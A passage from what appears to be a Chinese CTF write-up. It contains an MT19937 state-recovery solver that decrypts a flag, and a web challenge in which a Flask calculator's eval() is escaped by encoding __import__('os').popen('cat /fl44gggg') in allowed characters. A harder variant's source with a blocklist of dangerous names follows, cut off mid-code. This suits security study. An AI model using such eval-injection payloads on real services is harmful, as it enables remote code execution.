class="hljs-keyword">import</span> ast<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MT19937</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, state=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.w, <span class="hljs-variable language_">self</span>.n, <span class="hljs-variable language_">self</span>.m, <span class="hljs-variable language_">self</span>.r = <span class="hljs-number">32</span>, <span class="hljs-number">624</span>, <span class="hljs-number">397</span>, <span class="hljs-number">31</span><br>        <span class="hljs-variable language_">self</span>.a = <span class="hljs-number">0x9908B0DF</span><br>        <span class="hljs-variable language_">self</span>.u, <span class="hljs-variable language_">self</span>.d = <span class="hljs-number">11</span>, <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-variable language_">self</span>.s, <span class="hljs-variable language_">self</span>.b = <span class="hljs-number">7</span>, <span class="hljs-number">0x9D2C5680</span><br>        <span class="hljs-variable language_">self</span>.t, <span class="hljs-variable language_">self</span>.c = <span class="hljs-number">15</span>, <span class="hljs-number">0xEFC60000</span><br>        <span class="hljs-variable language_">self</span>.l = <span class="hljs-number">18</span><br>        <span class="hljs-variable language_">self</span>.index = <span class="hljs-variable language_">self</span>.n<br><br>        <span class="hljs-keyword">if</span> state:<br>            <span class="hljs-comment"># 确保状态数组长度为624</span><br>            <span class="hljs-variable language_">self</span>.MT = <span class="hljs-built_in">list</span>(state)<br>            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MT) &lt; <span class="hljs-variable language_">self</span>.n:<br>                <span class="hljs-variable language_">self</span>.MT.append(<span class="hljs-number">0</span>)<br>            <span class="hljs-variable language_">self</span>.MT = <span class="hljs-variable language_">self</span>.MT[:<span class="hljs-variable language_">self</span>.n]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.MT = [<span class="hljs-number">0</span>] * <span class="hljs-variable language_">self</span>.n<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">self</span>):<br>        lower_mask = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-variable language_">self</span>.r) - <span class="hljs-number">1</span><br>        upper_mask = (~lower_mask) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.n):<br>            x = (<span class="hljs-variable language_">self</span>.MT[i] &amp; upper_mask) | (<span class="hljs-variable language_">self</span>.MT[(i + <span class="hljs-number">1</span>) % <span class="hljs-variable language_">self</span>.n] &amp; lower_mask)<br>            xA = x &gt;&gt; <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> x &amp; <span class="hljs-number">1</span>:<br>                xA ^= <span class="hljs-variable language_">self</span>.a<br>            <span class="hljs-variable language_">self</span>.MT[i] = <span class="hljs-variable language_">self</span>.MT[(i + <span class="hljs-variable language_">self</span>.m) % <span class="hljs-variable language_">self</span>.n] ^ xA<br>        <span class="hljs-variable language_">self</span>.index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.index &gt;= <span class="hljs-variable language_">self</span>.n:<br>            <span class="hljs-variable language_">self</span>.twist()<br><br>        y = <span class="hljs-variable language_">self</span>.MT[<span class="hljs-variable language_">self</span>.index]<br>        y = y ^ ((y &gt;&gt; <span class="hljs-variable language_">self</span>.u) &amp; <span class="hljs-variable language_">self</span>.d)<br>        y = y ^ ((y &lt;&lt; <span class="hljs-variable language_">self</span>.s) &amp; <span class="hljs-variable language_">self</span>.b)<br>        y = y ^ ((y &lt;&lt; <span class="hljs-variable language_">self</span>.t) &amp; <span class="hljs-variable language_">self</span>.c)<br>        y = y ^ (y &gt;&gt; <span class="hljs-variable language_">self</span>.l)<br><br>        <span class="hljs-variable language_">self</span>.index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> y &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">untemper</span>(<span class="hljs-params">y</span>):<br>    y = y &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>    <span class="hljs-comment"># Reverse right shift 18</span><br>    y = y ^ (y &gt;&gt; <span class="hljs-number">18</span>)<br><br>    <span class="hljs-comment"># Reverse left shift 15 and mask</span><br>    temp = y<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        temp = y ^ ((temp &lt;&lt; <span class="hljs-number">15</span>) &amp; <span class="hljs-number">0xEFC60000</span>)<br>    y = temp<br><br>    <span class="hljs-comment"># Reverse left shift 7 and mask</span><br>    temp = y<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        temp = y ^ ((temp &lt;&lt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">0x9D2C5680</span>)<br>    y = temp<br><br>    <span class="hljs-comment"># Reverse right shift 11</span><br>    temp = y<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        temp = y ^ (temp &gt;&gt; <span class="hljs-number">11</span>)<br>    y = temp<br><br>    <span class="hljs-keyword">return</span> y &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">predict_next</span>(<span class="hljs-params">outputs, num_predict</span>):<br>    state = [untemper(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> outputs]<br>    mt = MT19937(state)<br><br>    predicted = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_predict):<br>        predicted.append(mt.extract_number())<br>    <span class="hljs-keyword">return</span> predicted<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    <span class="hljs-comment"># Read data.txt</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br>        K1_outputs = ast.literal_eval(lines[<span class="hljs-number">0</span>].strip())<br>        K2_outputs = ast.literal_eval(lines[<span class="hljs-number">1</span>].strip())<br>        c1 = ast.literal_eval(lines[<span class="hljs-number">2</span>].strip())<br>        c2 = ast.literal_eval(lines[<span class="hljs-number">3</span>].strip())<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Length of K1_outputs:&quot;</span>, <span class="hljs-built_in">len</span>(K1_outputs))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Length of K2_outputs:&quot;</span>, <span class="hljs-built_in">len</span>(K2_outputs))<br><br>    <span class="hljs-comment"># Calculate cal values</span><br>    <span class="hljs-comment"># 对于K1，我们使用全部624个状态</span><br>    cal1 = <span class="hljs-number">0</span><br>    next_nums1 = predict_next(K1_outputs, <span class="hljs-number">624</span>)<br>    cal1 = <span class="hljs-built_in">sum</span>(next_nums1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cal1 calculated:&quot;</span>, cal1)<br><br>    <span class="hljs-comment"># 对于K2，我们只使用前600个状态，但仍需预测156个数</span><br>    cal2 = <span class="hljs-number">0</span><br>    next_nums2 = predict_next(K2_outputs, <span class="hljs-number">156</span>)  <span class="hljs-comment"># 624//4 = 156</span><br>    cal2 = <span class="hljs-built_in">sum</span>(next_nums2)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cal2 calculated:&quot;</span>, cal2)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cal, ciphertext</span>):<br>        key = hashlib.sha256(<span class="hljs-built_in">str</span>(cal).encode()).digest()<br>        cipher = AES.new(key, AES.MODE_ECB)<br>        <span class="hljs-keyword">return</span> unpad(cipher.decrypt(ciphertext), <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Attempting decryption...&quot;</span>)<br>        m1 = decrypt(cal1, <span class="hljs-built_in">bytes</span>(c1))<br>        m2 = decrypt(cal2, <span class="hljs-built_in">bytes</span>(c2))<br>        flag = m1 + m2<br>        <span class="hljs-keyword">return</span> flag<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decryption error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cal1: <span class="hljs-subst">&#123;cal1&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cal2: <span class="hljs-subst">&#123;cal2&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting solver...&quot;</span>)<br>    flag = solve()<br>    <span class="hljs-keyword">if</span> flag:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode())<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag (raw):&quot;</span>, flag)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to recover flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="web复现"><a class="markdownIt-Anchor" href="#web复现"></a> web(复现)</h2><h3 id="0进制计算器"><a class="markdownIt-Anchor" href="#0进制计算器"></a> 0进制计算器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, jsonify<br>  <br>app = Flask(__name__)  <br>  <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_code</span>():  <br>    data = request.json  <br>    code = data.get(<span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <br>    output = executer(code)<br>    <span class="hljs-keyword">return</span> output   <br><br><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> redirect_stdout<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">StupidInterpreter</span>:  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):  <br>        <span class="hljs-variable language_">self</span>.variables = &#123;&#125;<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">interpret</span>(<span class="hljs-params">self, code</span>):  <br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.checker(code) == <span class="hljs-literal">False</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;有脏东西！&quot;</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        commands = code.split(<span class="hljs-string">&#x27;;&#x27;</span>)  <br>        <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> commands:<br>            command = command.strip()  <br>            <span class="hljs-keyword">if</span> command:  <br>                <span class="hljs-variable language_">self</span>.execute_command(command)  <br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self, command</span>):  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-keyword">in</span> command:  <br>            variable, expression = command.split(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-number">1</span>)  <br>            variable = variable.strip()  <br>            result = <span class="hljs-variable language_">self</span>.evaluate_expression(expression.strip())  <br>            <span class="hljs-variable language_">self</span>.variables[variable] = result  <br>        <span class="hljs-comment">#执行打印操作</span><br>        <span class="hljs-keyword">elif</span> command.startswith(<span class="hljs-string">&#x27;cdhor(&#x27;</span>) <span class="hljs-keyword">and</span> command.endswith(<span class="hljs-string">&#x27;)&#x27;</span>):<br>            expression = command[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>].strip()  <br>            result = <span class="hljs-variable language_">self</span>.evaluate_expression(expression)  <br>            <span class="hljs-built_in">print</span>(result)  <br>        <span class="hljs-keyword">else</span>:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;未知指令: <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)  <br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_expression</span>(<span class="hljs-params">self, expression</span>):  <br>        <span class="hljs-keyword">for</span> var, value <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.variables.items():  <br>            expression = expression.replace(var, <span class="hljs-built_in">str</span>(value))  <br>        <span class="hljs-keyword">try</span>:  <br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(expression, &#123;&#125;, &#123;&#125;)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;执行出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <br>                <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checker</span>(<span class="hljs-params">self, string</span>):<br>        <span class="hljs-keyword">try</span>:<br>            string.encode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>        <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span> <br>        allow_chr = <span class="hljs-string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string:  <br>            <span class="hljs-keyword">if</span> char <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> allow_chr:  <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">executer</span>(<span class="hljs-params">code</span>):<br>    outputIO = StringIO()<br>    interpreter = StupidInterpreter()  <br>    <span class="hljs-keyword">with</span> redirect_stdout(outputIO):<br>        interpreter.interpret(code)<br>    output = outputIO.getvalue()<br>    <span class="hljs-keyword">return</span>(output)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:  <br>    app.run(debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">allow_chr = <span class="hljs-string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span><br></code></pre></td></tr></table></figure><p>这是运行通过的字符，<code>eval</code>可以执行的一是&quot;=&quot;号右侧的部分，二是cdhor()内的部分</p><p>cdhor刚好可以组成chr和ord，可以利用这两个函数来组成任意字符。chr(ord())形式的代码可以在等号右侧被转换为需要执行的代码后，再经过cdhor()执行并输出结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_char</span>(<span class="hljs-params">char</span>):<br>    char_ascii_bin = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(char)))<br>    result = []<br>    index = <span class="hljs-built_in">len</span>(char_ascii_bin) - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> char_ascii_bin:<br>        <span class="hljs-keyword">if</span> index == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> a == <span class="hljs-string">&quot;1&quot;</span>:<br>            result.append(<span class="hljs-string">&quot;(ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;))&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> index != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> a == <span class="hljs-string">&quot;1&quot;</span>:<br>            mid_res = [<span class="hljs-string">&quot;(ord(&#x27;*&#x27;)-ord(&#x27;(&#x27;))&quot;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(index)]<br>            result.append(<span class="hljs-string">&quot;*&quot;</span>.join(mid_res))<br>        index -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;+&quot;</span>.join(result))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sentence</span>(<span class="hljs-params">string</span>):<br>    char_expressions = [<span class="hljs-string">&quot;chr(&quot;</span> + generate_char(char) + <span class="hljs-string">&quot;)&quot;</span> <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string]<br>    sentence_expression = <span class="hljs-string">&quot;+&quot;</span>.join(char_expressions)<br>    <span class="hljs-keyword">return</span>(sentence_expression)<br><br><span class="hljs-comment"># 定义字符串</span><br>sentence = <span class="hljs-string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /fl44gggg&#x27;).read()&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 生成表达式</span><br>generated_expression = generate_sentence(sentence)<br><br><span class="hljs-comment"># 打印生成的表达式</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Generated Expression:&quot;</span>)<br><span class="hljs-built_in">print</span>(generated_expression)<br><br><span class="hljs-comment"># 执行并打印结果</span><br>result = <span class="hljs-built_in">eval</span>(generated_expression)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nExecution Result:&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/26.png" alt="26"></p><p>解密脚本的大致原理是设定了权值，将代码转化为ASCII再转化为二进制的形式，按照给定的权值进行转化，最后再拼接，本地可以测试测试。</p><h3 id="0进制计算器-pro-max"><a class="markdownIt-Anchor" href="#0进制计算器-pro-max"></a> 0进制计算器 pro max</h3><p>先上源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, jsonify<br><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> redirect_stdout<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> addaudithook<br><br>audit_enabled = <span class="hljs-literal">False</span><br>dangerous_operation_detected = <span class="hljs-literal">False</span><br><br>app = Flask(__name__)  <br>  <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>) <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_code</span>():  <br>    data = request.json  <br>    code = data.get(<span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <br>    output = executer(code)<br>    <span class="hljs-keyword">return</span> output   <br><br>dangerous_operations = [<br>    <span class="hljs-string">&quot;marshal&quot;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;interpreter&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <br>    <span class="hljs-string">&quot;cpython&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;gc&quot;</span><br>]<br>dangerous_strings = [<span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>]<br>dangerous_opcodes = [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>]<br>allowed_functions = [<span class="hljs-string">&quot;print&quot;</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CleverInterpreter</span>:  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):  <br>        <span class="hljs-variable language_">self</span>.variables = &#123;&#125;<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">interpret</span>(<span class="hljs-params">self, code</span>):  <br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.checker(code) == <span class="hljs-literal">False</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;有脏东西！&quot;</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-string">&quot;&quot;</span>)<br>        commands = code.split(<span class="hljs-string">&#x27;;&#x27;</span>)  <br>        <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> commands:  <br>            command = command.strip()  <br>            <span class="hljs-keyword">if</span> command:  <br>                <span class="hljs-variable language_">self</span>.execute_command(command)  <br>  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self, command</span>):  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-keyword">in</span> command:  <br>            variable, expression = command.split(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-number">1</span>)  <br>            variable = variable.strip()  <br>            result = <span class="hljs-variable language_">self</span>.evaluate_expression(expression.strip())  <br>            <span class="hljs-variable language_">self</span>.variables[variable] = result  <br>        <span class="hljs-comment"># 执行打印操作</span><br>        <span class="hljs-keyword">elif</span> command.startswith(<span class="hljs-string">&#x27;cdhor(&#x27;</span>) <span class="hljs-keyword">and</span> command.endswith(<span class="hljs-string">&#x27;)&#x27;</span>):<br>            expression = command[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>].strip()  <br>            result = <span class="hljs-variable language_">self</span>.safe_executer(<span class="hljs-string">&#x27;print(&#x27;</span> + expression + <span class="hljs-string">&#x27;)&#x27;</span>)  <br>            <span class="hljs-built_in">print</span>(result)  <br>        <span class="hljs-keyword">else</span>:  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;未知指令: <span 